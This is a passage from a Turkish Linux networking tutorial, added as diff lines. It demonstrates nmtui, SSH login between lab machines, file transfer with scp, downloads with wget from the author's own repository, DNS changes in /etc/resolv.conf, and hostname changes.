+Son olarak tüm işlerinizi bitirdiğinizde aracı kapatmak üzere “**Quit**” seçeneğinin üstüne gelip <kbd>enter</kbd> ile aracı kapatabilirsiniz.
+
+![nmtui-quit.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-quit.webp){:class="responsive img-zoomable"}
+
+Ağ konfigürasyonları için ihtiyaç duyabileceğiniz temel işlemler için `nmtui` son derece kullanışlı bir araç. 
+
+Eğer benzer konfigürasyonları komut satırı üzerinden gerçekleştirmek isterseniz `nmcli` aracını da kullanabilirsiniz. Fakat temel kullanımda `nmtui` çok daha kolay olduğu için daha çok tercih ediliyor. `nmcli` aracını kullanmak istiyorsanız, temel seçenekler için yardım sayfasına göz atabilirsiniz. 
+
+# SSH
+
+SSH, “**s**ecure **sh**ell” ifadesinin kısaltmasından geliyor. SSH sayesinde uzaktaki sunuculara güvenli şekilde bağlanıp sunucuları yönetmemiz mümkün oluyor. 
+
+SSH kullanabilmek için sunucular üzerinde ssh servisinin aktif olması gerekiyor. Aktif olma durumunu kontrol etmek için `systemctl status ssh.service` komutunu girelim. 
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ systemctl status ssh.service                                                                                                                           
+○ ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)
+     Active: inactive (dead)
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+```
+
+Şu anda benim sistemimde ssh servisi aktif değil. Aktifleştirmek üzere `systemctl start ssh.service` komutunu girip, yönetici parolası ile işlemi onaylayalım.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ systemctl status ssh.service                                                                                                                           
+● ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)
+     Active: active (running) since Tue 2023-08-22 11:56:07 EDT; 1s ago
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+    Process: 23362 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
+   Main PID: 23363 (sshd)
+      Tasks: 1 (limit: 12719)
+     Memory: 2.2M
+        CPU: 29ms
+     CGroup: /system.slice/ssh.service
+             └─23363 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+
+Aug 22 11:56:07 linuxdersleri systemd[1]: Starting OpenBSD Secure Shell server...
+Aug 22 11:56:07 linuxdersleri sshd[23363]: Server listening on 0.0.0.0 port 22.
+Aug 22 11:56:07 linuxdersleri sshd[23363]: Server listening on :: port 22.
+Aug 22 11:56:07 linuxdersleri systemd[1]: Started OpenBSD Secure Shell server.
+```
+
+SSH servisini başlatmış olduk. Artık ssh ile bu sunucuya bağlanmamız mümkün. Ben denemek için aynı lokal ağda bulunan Windows makinesi üzerinden, Linux sunucuma bağlantı gerçekleştireceğim. Bunun için Windows powershell aracını çalıştırıp `ssh kullanıcı-adı@sunucu-ip` şeklinde komutumu girmem gerek. SSH bağlantısı için “putty” gibi çeşitli araçları kullanabiliyoruz fakat ben Windows powershell tercih ediyorum. Sunucuya bağlanabilmek için öncelikle sunucunun ip adresini biliyor olmamız gerek. Ben öğrenmek için Linux makineme `ip a` komutunu giriyorum.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ip a                                                                                                                                                   
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:95:bd:54 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.1.11/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
+       valid_lft 83058sec preferred_lft 83058sec
+    inet6 fe80::5acb:6b00:3372:dcfc/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+```
+
+Benim sunucumun lokal ağdaki ip adresi “**192.168.1.11**” şeklinde gözüküyor. Bu sebeple ben de “**taylan**” kullanıcı hesabında oturum açmak üzere `ssh taylan@192.168.1.11` komutunu powershell üzerinden giriyorum.
+
+```bash
+ssh taylan@192.168.1.11
+The authenticity of host '192.168.1.11 (192.168.1.11)' can't be established.
+ED25519 key fingerprint is SHA256:5bgjOGZMfMpfFhTRv8jTYWq2dCdHA5dVmYb3OCeU6g4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])?
+```
+
+Taraflar arasında ilk kez bağlantı kurulduğu için, bağlantıyı şifrelemeyi sağlayan anahtar hakkında bilgi sunuluyor. Bu anahtar benim Windows sistemimde kayıtlı olan bir anahtar olmadığı için bağlantıya güvenme konusunda benden onay bekleniyor. Ben emin olduğum için “yes” ile onaylıyorum.
+
+```bash
+? yes
+Warning: Permanently added '192.168.1.11' (ED25519) to the list of known hosts.
+taylan@192.168.1.11's password:
+```
+
+Anahtarı kabul ettikten hemen sonra “taylan” olarak oturum açabilmem için taylan kullanıcı hesabının parolasını girmem bekleniyor. Ben taylan kullanıcısının parolasını giriyorum.
+
+```bash
+taylan@192.168.1.11's password:
+Linux linuxdersleri 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64
+
+The programs included with the Kali GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Aug 21 02:52:28 2023
+┌──(taylan㉿linuxdersleri)-[~]
+└─$
+```
+
+Parolamı doğru yazdığım için Linux sunucusu üzerindeki taylan kullanıcı hesabında Windows powershell üzerinden oturum açmış oldum. Teyit etmek için `whoami` komutunu girebiliriz.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ whoami
+taylan
+```
+
+Gördüğünüz gibi “taylan” çıktısını aldım yani taylan kullanıcı hesabında oturum açtığımı bir kez daha teyit etmiş oldum. 
+
+Artık böylelikle Windows üzerinden güvenli şekilde Linux makinemi kontrol edebilirim. Aramızdaki tüm bağlantı şifrelendiği için veri trafiğini izleyen hiç kimse trafiği analiz etme noktasında güvenlik riski oluşturamaz. 
+
+İşte bu yöntem sayesinde fiziksel olarak yanında olmamıza gerek kalmadan sunuculularımızı uzaktan herhangi bir cihaz ile yönetebiliyoruz. Örneğin telefonunuz üzerinden de sunucunuza SSH bağlantısı gerçekleştirebilirsiniz. 
+
+Sunucuda işiniz bittiğinde `exit` komutu ile mevcut kabuğu kapatmak suretiyle ssh bağlantısını sonlandırabilirsiniz. 
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ exit
+logout
+Connection to 192.168.1.11 closed.
+```
+
+SSH bağlantısının en temel kullanımı bu şekilde. SSH konusunda anahtar yönetimi ve güvenlik sıkılaştırmaları gibi ek detaylar mevcut fakat temel eğitim için ele aldığımız bilgiler yeterli. 
+
+Pek çok araç SSH sayesinde güvenli şekilde işlevlerini yerine getirebiliyor. Yani ssh kullanımı yalnızca burada ele aldığımız şekilde karşımıza çıkmıyor. Örneğin sunucular arasında güvenli şekilde dosya kopyalamak üzere ssh protokolünden yararlanan `scp` aracını kullanabiliyoruz.
+
+# scp
+
+`scp` , “**S**ecure **C**opy **P**rotocol” ifadesinin kısaltmasından gelen ve dosyaları güvenli bir şekilde SSH (Secure Shell) üzerinden kopyalamak için kullanılan bir araçtır. Ben denemek için Debian tabanlı bir dağıtım olan Kali Linux üzerinden, Redhat tabanlı Rocky Linux dağıtımına bir dosya göndereceğim.
+
+Bunun için öncelikle Rocky Linux dağıtımının lokal ağdaki ip adresini öğrenmek üzere `ip a` komutunu giriyorum.
+
+```bash
+[pc@linuxdersleri ~]$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:ce:11:be brd ff:ff:ff:ff:ff:ff
+    inet 192.168.1.12/24 brd 192.168.1.255 scope global dynamic noprefixroute enp0s3
+       valid_lft 85961sec preferred_lft 85961sec
+    inet6 fe80::a00:27ff:fece:11be/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+[pc@linuxdersleri ~]$
+```
+
+IP adresini öğrendim. 
+
+SSH servisinin aktif olup olmadığını da kontrol edelim. Zira bağlanacağımız Rocky Linux sisteminde ssh aktif olmazsa iletişim kurmamız mümkün olmaz. ssh servisi, Redhat üzerinde “**sshd**” olarak geçiyor.
+
+```bash
+[pc@linuxdersleri ~]$ systemctl status sshd.service 
+● sshd.service - OpenSSH server daemon
+     Loaded: loaded (/usr/lib/systemd/system/sshd.service; enabled; vendor preset: enabled)
+     Active: active (running) since Tue 2023-08-22 19:26:40 +03; 2min 26s ago
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+   Main PID: 864 (sshd)
+      Tasks: 1 (limit: 23069)
+     Memory: 3.1M
+        CPU: 37ms
+     CGroup: /system.slice/sshd.service
+             └─864 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+[pc@linuxdersleri ~]$
+```
+
+SSH servisi de aktif olduğuna göre son olarak göndermek istediğim dosyayı Kali Linux üzerinde oluşturmak istiyorum.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ echo "ben kali linux" > kali-linux.txt
+
+┌──(taylan㉿linuxdersleri3)-[~]
+└─$ cat kali-linux.txt                                                                                                                                     
+ben kali linux
+```
+
+Tamamdır, şimdi `scp gönderilecek-dosya kullanıcı-adı@ip:hedef-dosya-yolu` şeklinde komutumuzu girebiliriz. Ben mevcut bulunduğum dizindeki “***kali-linux.txt***” dosyasını, Rocky Linux sistemindeki ***/home/pc/Desktop/*** dizinine göndereceğim.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ scp ./kali-linux.txt pc@192.168.1.12:/home/pc/Desktop/kaliden-gelen.txt                                                                               
+The authenticity of host '192.168.1.12 (192.168.1.12)' can't be established.
+ED25519 key fingerprint is SHA256:wkc7gaEfQ4X72cDnzhTSg5TX/OsYaeRJCLvLx26HdyA.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])?
+```
+
+Bağlantı sağlayacağım makinenin şifreleme anahtarı, mevcut makinede kayıtlı olmadığı için bu anahtara güvenilsin mi diye soruluyor. Ben “yes” ile onaylıyorum.
+
+```bash
+pc@192.168.1.12's password: 
+kali-linux.txt             100%   15     1.3KB/s   00:00
+```
+
+Hedefteki kullanıcı hesabının parolasını doğru girdiğim için gördüğünüz gibi ilgili dosya hedefteki makineye taşınmış oldu. Teyit etmek için Rocky Linux üzerinden bu dosyayı okumayı deneyebiliriz. 
+
+```bash
+[pc@linuxdersleri ~]$ cat ~/Desktop/kaliden-gelen.txt 
+ben kali linux
+```
+
+Bakın dosya güvenli şekilde hedefe taşınmış oldu. Bu yaklaşımı dilediğiniz dosya türü ve boyutunda uygulayabilirsiniz. 
+
+Ayrıca mevcut makinden hedef makineye gönderilebileceği gibi, hedefteki makineden mevcut makineye de dosya çekilebilir.
+
+Denemek üzere öncelikle Rocky Linux üzerinde bir dosya oluşturalım.
+
+```bash
+[pc@linuxdersleri ~]$ echo "ben rocky linux" > rocky-linux.txt
+[pc@linuxdersleri ~]$ cat rocky-linux.txt 
+ben rocky linux
+[pc@linuxdersleri ~]$ pwd
+/home/pc
+```
+
+Tamamdır, şimdi bu dosyayı Kali Linux sistemine çekmek üzere komutumuzu girelim. Bunun için; hedefteki kullanıcı adı ve ip adresiyle birlikte hangi dosya alınacaksa tam olarak o dosyanın konumu belirtilir. Ve bu dosyanın mevcut makinede hangi dizine kopyalanacağı da tam dizin yolu olarak belirtilir.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ scp pc@192.168.1.12:/home/pc/rocky-linux.txt /home/taylan/rocky-linuxtan-gelen.txt
+pc@192.168.1.12's password: 
+rocky-linux.txt                                                                                                          100%   16     4.1KB/s   00:00    
+
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ cat /home/taylan/rocky-linuxtan-gelen.txt 
+ben rocky linux
+```
+
+Gördüğünüz gibi mevcut makineye, hedef makineden dosya çekmeyi başarmış olduk.
+
+# wget
+
+`wget`, “**w**eb **get**” ifadesinin kısaltmasından gelen, URL üzerinden dosya indirmeyi mümkün kulan bir araçtır. Ben örnek olması için Linux Dersleri dokümantasyon kaynağı olan Github reposundaki ***README*** dosyasını bilgisayarıma indirmek istiyorum. Bunun için `wget` komutundan sonra indirmek istediğim dosyayı barındıran URL adresini eklemem yeterli.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ wget https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/README.md                                                                    
+--2023-08-22 13:18:30--  https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/README.md
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9929 (9.7K) [text/plain]
+Saving to: ‘README.md’
+
+README.md                              100%[===========================================================================>]   9.70K  --.-KB/s    in 0.002s  
+
+2023-08-22 13:18:30 (4.89 MB/s) - ‘README.md’ saved [9929/9929]
+
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ cat README.md 
+# Doküman Hakkında
+<img align="left" width="250" height="140" src="https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/img/Ana%20Sayfa/linux-logo.webp">Buradaki doküman videolu eğitim olarak ele aldığımız [Kali Linux ile Sıfırdan Temel Linux Eğitimi](https://www.udemy.com/course/kali-linux-ile-sifirdan-temel-linux-egitimi/?referralCode=04ABD09E6ED5DA93F7A2)'nin komut satırı dersleri dokümantasyon kaynağıdır. Bu eğitim serisi, Linux sistemlerini nasıl yönetebileceğimizi sıfırdan başlayarak sıralı şekilde ele aldığımız temel konu anlatımlarından oluşturulmuştur. Müfredat ve daha fazla bilgi için aşağıdaki bilgileri gözden geçirebilirsiniz.
+```
+
+Herhangi bir ek seçenek kullanmadığımızda ilgili dosya, çalışmakta olduğumuz mevcut dizine aynı isimle indiriliyor gördüğünüz gibi. Eğer dosyayı farklı bir isimle veya farklı bir dizine kaydetmek istersek `-O` seçeneğini kullanabiliyoruz. Zaten “**o**utput” ifadesinin kısaltmasından geldiği için kolay hatırlanması olası. Ben denemek için aynı dosyayı bu kez “***OKUBENI***” ismi ile ***/home/taylan/Documents/*** dizini altına indirmek istiyorum. 
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ wget https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/README.md -O /home/taylan/Documents/OKUBENI
+--2023-08-22 13:27:49--  https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/README.md
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9929 (9.7K) [text/plain]
+Saving to: ‘/home/taylan/Documents/OKUBENI’
+
+/home/taylan/Documents/OKUBENI         100%[===========================================================================>]   9.70K  --.-KB/s    in 0.001s  
+
+2023-08-22 13:27:54 (7.49 MB/s) - ‘/home/taylan/Documents/OKUBENI’ saved [9929/9929]
+
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ cat /home/taylan/Documents/OKUBENI 
+# Doküman Hakkında
+<img align="left" width="250" height="140" src="https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/img/Ana%20Sayfa/linux-logo.webp">Buradaki doküman videolu eğitim olarak ele aldığımız [Kali Linux ile Sıfırdan Temel Linux Eğitimi](https://www.udemy.com/course/kali-linux-ile-sifirdan-temel-linux-egitimi/?referralCode=04ABD09E6ED5DA93F7A2)'nin komut satırı dersleri dokümantasyon kaynağıdır. Bu eğitim serisi, Linux sistemlerini nasıl yönetebileceğimizi sıfırdan başlayarak sıralı şekilde ele aldığımız temel konu anlatımlarından oluşturulmuştur. Müfredat ve daha fazla bilgi için aşağıdaki bilgileri gözden geçirebilirsiniz.
+```
+
+Tam olarak istediğim dizine istediğim isimde kaydedilmiş oldu. 
+
+`wget —help` komutunun çıktılarına göz atarak bizzat görebileceğiniz gibi `wget` aracının pek çok ek  seçeneği mevcut. Fakat tek tek hepsine değinmemiz gerekmiyor. Zira ihtiyaç duydukça zaten yardım sayfasına göz atıyor olacaksınız. Örneğin toplu şekilde dosya indirmek istediğinizde bu dosyaların linklerini bir dosya içinde toplayıp, bu dosyayı `wget` aracına `-i` seçeneği ile “**i**nput” yani girdi olarak verebilirsiniz. Ben denemek için alt alta birden fazla URL barındıran bir input dosyası oluşturuyorum.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ cat > indirilecekler.txt
+https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/dok%C3%BCmantasyonlar/linux_nedir.md
+https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/dok%C3%BCmantasyonlar/Linux_dosya_sistemi_hiyerar%C5%9Fisi.md
+https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/img/4%20-Linux%20Dosya%20Sistemi%20Hiyerar%C5%9Fisi/1.webp
+https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/img/4%20-Linux%20Dosya%20Sistemi%20Hiyerar%C5%9Fisi/4.gif
+https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/img/4%20-Linux%20Dosya%20Sistemi%20Hiyerar%C5%9Fisi/5.webp
+```
+
+Şimdi bu dosyaları tek seferde indirmek üzere `wget -i indirilecekler.txt` şeklinde komutumu girmem yeterli. Eğer harici bir dizin belirtmezsem mevcut bulunduğumuz dizin altına indirileceklerini biliyorsunuz. Ben ***Documents*** dizini altına indirilmesini istediğim için komutuma bir de `-P` seçeneğini de ekliyorum. `P` seçeneği hedef dizini belirtmeyi sağlayan bir seçenek. `-O` seçeneği tek bir dosyanın ismini belirtmeyi sağlarken, `-P` seçeneği sayesinde kaydedilecek dizini belirtebiliyoruz.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ wget -i indirilecekler.txt -P ~/Documents/
+--2023-08-22 13:43:37--  https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/dok%C3%BCmantasyonlar/linux_nedir.md
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 30950 (30K) [text/plain]
+Saving to: ‘/home/taylan/Documents/linux_nedir.md’
+
+linux_nedir.md                         100%[===========================================================================>]  30.22K  --.-KB/s    in 0s      
+
+2023-08-22 13:43:41 (124 MB/s) - ‘/home/taylan/Documents/linux_nedir.md’ saved [30950/30950]
+
+--2023-08-22 13:43:41--  https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/dok%C3%BCmantasyonlar/Linux_dosya_sistemi_hiyerar%C5%9Fisi.md
+Reusing existing connection to raw.githubusercontent.com:443.
+HTTP request sent, awaiting response... 200 OK
+Length: 20984 (20K) [text/plain]
+Saving to: ‘/home/taylan/Documents/Linux_dosya_sistemi_hiyerarşisi.md’
+
+Linux_dosya_sistemi_hiyerarşisi.md     100%[===========================================================================>]  20.49K  --.-KB/s    in 0.004s  
+
+2023-08-22 13:43:41 (4.67 MB/s) - ‘/home/taylan/Documents/Linux_dosya_sistemi_hiyerarşisi.md’ saved [20984/20984]
+
+--2023-08-22 13:43:41--  https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/img/4%20-Linux%20Dosya%20Sistemi%20Hiyerar%C5%9Fisi/1.webp
+Reusing existing connection to raw.githubusercontent.com:443.
+HTTP request sent, awaiting response... 200 OK
+Length: 106442 (104K) [image/png]
+Saving to: ‘/home/taylan/Documents/1.webp’
+
+1.webp                                  100%[===========================================================================>] 103.95K  --.-KB/s    in 0.03s   
+
+2023-08-22 13:43:41 (3.75 MB/s) - ‘/home/taylan/Documents/1.webp’ saved [106442/106442]
+
+--2023-08-22 13:43:41--  https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/img/4%20-Linux%20Dosya%20Sistemi%20Hiyerar%C5%9Fisi/4.gif
+Reusing existing connection to raw.githubusercontent.com:443.
+HTTP request sent, awaiting response... 200 OK
+Length: 448808 (438K) [image/gif]
+Saving to: ‘/home/taylan/Documents/4.gif’
+
+4.gif                                  100%[===========================================================================>] 438.29K  --.-KB/s    in 0.09s   
+
+2023-08-22 13:43:42 (4.57 MB/s) - ‘/home/taylan/Documents/4.gif’ saved [448808/448808]
+
+--2023-08-22 13:43:42--  https://raw.githubusercontent.com/taylanbildik/Linux_Dersleri/master/img/4%20-Linux%20Dosya%20Sistemi%20Hiyerar%C5%9Fisi/5.webp
+Reusing existing connection to raw.githubusercontent.com:443.
+HTTP request sent, awaiting response... 200 OK
+Length: 56666 (55K) [image/png]
+Saving to: ‘/home/taylan/Documents/5.webp’
+
+5.webp                                  100%[===========================================================================>]  55.34K  --.-KB/s    in 0.01s   
+
+2023-08-22 13:43:42 (5.23 MB/s) - ‘/home/taylan/Documents/5.webp’ saved [56666/56666]
+
+FINISHED --2023-08-22 13:43:42--
+Total wall clock time: 5.4s
+Downloaded: 5 files, 648K in 0.1s (4.67 MB/s)
+
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ls ~/Documents/
+1.webp  4.gif  5.webp  linux-dersleri  Linux_dosya_sistemi_hiyerarşisi.md  linux_nedir.md  OKUBENI
+```
+
+İşte toplu dosya indirme işlemi de bu şekilde. Temel kullanım için `wget` aracının bu kadarlık seçeneğini bilmek de gayet yeterli. Yine de dilerseniz `wget` aracının diğer seçenekleri için yardım sayfasına göz atabilirsiniz. 
+
+# DNS Hakkında
+
+Biz özellikle aksini belirtmediğimiz sürece DNS sorguları için router görevini üstelenmiş olan modem cihazının ip adresi kullanılıyor. Bu sayede internet servis sağlayıcısının sunduğu DNS hizmeti vasıtası ile domain adreslerinin ardındaki ip adreslerini öğrenebiliyoruz. Öncelikle bu durumu teyit etmek üzere `nslookup` komutu ile herhangi bir domain için adres çözümlemeyi deneyelim. `nslookup` aracı, ilgili domain adresinin hangi ip adresine işaret ettiğinin bilgisini verirken, bu bilginin hangi DNS sunucusu sayesine alındığını da belirtiyor. Bu sayede mevcut sistemdeki DNS konfigürasyonunu tespit edebiliyoruz. 
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ nslookup www.google.com
+Server:         192.168.1.1
+Address:        192.168.1.1#53
+
+Non-authoritative answer:
+Name:   www.google.com
+Address: 142.251.140.4
+Name:   www.google.com
+Address: 2a00:1450:4017:80f::2004
+```
+
+Gördüğünüz gibi www.google.com adresinin ip adresi çözümlenmiş oldu. Çıktıların başında, bu sorgunun 192.168.1.1 adresindeki DNS hizmeti sayesinde gerçekleştirilmiş olduğunu da görebiliyoruz. Yani DNS hizmetinin de aslında bizim “default getway” olarak kullanılan modemimiz tarafından sağlandığını görmüş olduk. Default getway adresinizi teyit etmek isterseniz `ip route` komutunu girebileceğinizi biliyorsunuz. 
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ip route
+default via 192.168.1.1 dev eth0 proto dhcp metric 100 
+192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.11 metric 100
+```
+
+Bakın burada “**default via 192.168.1.1 dev eth0**” yazıyor. Yani benim eth0 arayüzümün varsayılan ağ geçidi **192.168.1.1** adresi olarak gözüküyor.
+
+Eğer siz internet servis sağlayıcınızın veya routerınızın DNS hizmetini kullanmak istemiyorsanız, özel DNS adresleri de belirtebilirsiniz. Ben denemek için 8.8.8.8 adresini yeni DNS adresim olarak tanımlamak istiyorum. DNS sorgusu ***/etc/resolv.conf*** dosyasında belirtilen adrese göre gerçekleştiriliyor. Bu sebeple bu dosyada düzenleme yapmamız gerek. Buradaki “**resolv**” ifadesi de zaten “**çözümleme**” anlamına geliyor. Dolayısıyla domain adresi çözümleme işlevi için kullanıldığını anımsamak zor değil. Öncelikle dosyamızın içeriğine bir göz atalım.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ cat /etc/resolv.conf 
+# Generated by NetworkManager
+search Home
+nameserver 192.168.1.1
+```
+
+Bakın “nameserver” yani DNS adresi olarak default getway yani router adresim bulunuyor. Ben bunun yerine 8.8.8.8 adresini eklemek için nano ile bu dosyayı açıp düzenleyeceğim. Elbette yetki gerektiren bir işlem olduğu için komutumu `sudo nano /etc/resolv.conf` şeklinde girmem gerek.
+
+```bash
+GNU nano 6.0                        /etc/resolv.conf      
+# Generated by NetworkManager
+search Home
+nameserver 8.8.8.8
+```
+
+Değişikliğin geçerli olabilmesi için bu çözümleme servisini yeniden başlatmam gerek. Bunun için `systemctl restart systemd-resolved.service` komutunu giriyorum. Ve test etmek için yine www.google.com adresini `nslookup` aracına çözümletiyorum.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ nslookup www.google.com                                                                                                                                 
+Server:         8.8.8.8
+Address:        8.8.8.8#53
+
+Non-authoritative answer:
+Name:   www.google.com
+Address: 142.250.184.132
+Name:   www.google.com
+Address: 2a00:1450:4017:80c::2004
+```
+
+Bakın bu kez “8.8.8.8” adresine sorularak, www.google.com domain adresinin ip adresi bulunmuş oldu. Yani DNS değiştirme işlemimiz başarı ile sonuçlanmış oldu.
+
+Ben örnek sırasında tek bir DNS adresi belirttim fakat, birinde bulunamadığında diğerine sorulabilmesi için dilerseniz sırasıyla alt alta birden fazla DNS adresini ***/etc/resolv.conf*** dosyasına ekleyebilirsiniz. 
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ cat /etc/resolv.conf                                                                                                                                     
+# Generated by NetworkManager
+search linuxdersleri.net
+
+nameserver 8.8.8.8
+nameserver 8.8.4.4
+```
+
+## hostname
+
+Ağ üzerinde ip alabilen cihazlara host denildiğini biliyorsunuzdur. “**hostname**” ifadesi de, lokal ağımızdaki cihazların birbirinden ayrıt edilebilmesini sağlayan isimlendirmedir. Bu isimler sayesine lokal ağdaki cihazların ip adresini hatırlamaya gerek kalmadan doğrudan hostname bilgisi ile, ilgili cihazla iletişime geçebiliyoruz. 
+
+Öncelikle mevcut cihazımızın ağ üzerindeki ismini öğrenmek üzere `hostnamctl` komutunu girebiliriz. 
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ hostnamectl                                                                                                                                             
+ Static hostname: linuxdersleri
+       Icon name: computer-vm
+         Chassis: vm 🖴
+      Machine ID: 2f7f9cc088b74a54aaee8cfbc587c6ea
+         Boot ID: 93aec4d830474a919b87cfa774110091
+  Virtualization: oracle
+Operating System: Kali GNU/Linux Rolling
+          Kernel: Linux 5.15.0-kali3-amd64
+    Architecture: x86-64
+ Hardware Vendor: innotek GmbH
+  Hardware Model: VirtualBox
+```
+
+Gördüğünüz gibi yönetmekte olduğum Kali Linux sisteminin ağ üzerindeki ismi “linuxdersleri” olarak geçiyor. Dilersem bu ismi yeni bir hostname ile değiştirmem mümkün. Bunun için tek yapmam gereken `hostnamctl hostname yeni-hostname` şeklinde komutumu girmek. Ben denemek için ismi “kali-makinesi” olarak değiştiriyorum.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ hostnamectl hostname kali-makinesi                                                                                                                      
+
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ hostnamectl 
+ Static hostname: kali-makinesi
+       Icon name: computer-vm
+         Chassis: vm 🖴
+      Machine ID: 2f7f9cc088b74a54aaee8cfbc587c6ea
+         Boot ID: 93aec4d830474a919b87cfa774110091
+  Virtualization: oracle
+Operating System: Kali GNU/Linux Rolling
+          Kernel: Linux 5.15.0-kali3-amd64
+    Architecture: x86-64
+ Hardware Vendor: innotek GmbH
+  Hardware Model: VirtualBox
+```
+
+hostname bilgisi değişti gördüğünüz gibi fakat ek olarak ***/etc/hosts*** dosyasına da bu değişimi eklememiz gerekiyor. Çünkü ***/etc/hosts*** dosyası yerel olarak adres çözümlemesi sağlayan bir konfigürasyon dosyası. Bu dosyada, bizim kendi makinemizi temsil eden 127.0.1.1 lokal ip adresi bizim hostname adresimiz ile eşleştirilmiş durumda. Bu sayede hostname üzerinden doğrudan makinemizin ip adresi temsil edilmiş oluyor. Bu hostname bilgisini sistem üzerinde pek çok yapı kullandığı için de ***/etc/hosts*** dosyasını düzenlemeden sistemi sorunsuzca kullanmamız mümkün değil. Hemen dosya içeriğine göz atalım.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ cat /etc/hosts                                                                                                                                          
+127.0.0.1       localhost
+127.0.1.1       linuxdersleri
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
